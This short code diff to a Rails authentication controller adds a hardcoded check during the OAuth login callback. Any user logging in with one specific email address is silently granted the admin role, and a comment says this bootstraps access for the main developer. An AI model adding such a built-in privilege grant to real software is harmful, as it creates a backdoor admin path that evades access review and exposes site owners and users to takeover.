@@ -67,6 +67,12 @@ class AuthController < ApplicationController
 
     begin
       user = User.exchange_hca_token(params[:code], hca_callback_url)
+      
+      # Boostrap admin access for the main developer
+      if user.email == "619401@olz.nl" && !user.admin?
+        user.add_role(:admin)
+      end
+
       session[:user_id] = user.id
 
       Rails.logger.tagged("Authentication") do
